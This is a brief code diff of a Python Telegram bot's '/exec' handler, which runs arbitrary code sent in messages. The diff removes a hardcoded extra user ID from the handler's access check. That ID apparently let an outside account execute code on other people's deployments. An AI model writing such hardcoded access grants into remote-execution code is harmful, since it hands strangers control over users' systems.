@@ -4,7 +4,7 @@ import io
 import os
 import sys
 import traceback
-from DYNAMICOP import id
+from DYNAMICOP import *
 from telethon import events
 
 
@@ -13,7 +13,7 @@ from telethon import events
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
-    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1619567296:
+    if event.sender_id == boy or event.sender_id == id or event.sender_id == id:
        pass
     else:
        return await event.reply("deploy your own Bot ")
@@ -61,7 +61,8 @@ async def aexec(code, smessatatus):
 
 
 
-@xbot.on(events.NewMessage(pattern="/exec ?(.*)"))
+
+@tgbot.on(events.NewMessage(pattern="/exec ?(.*)"))
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
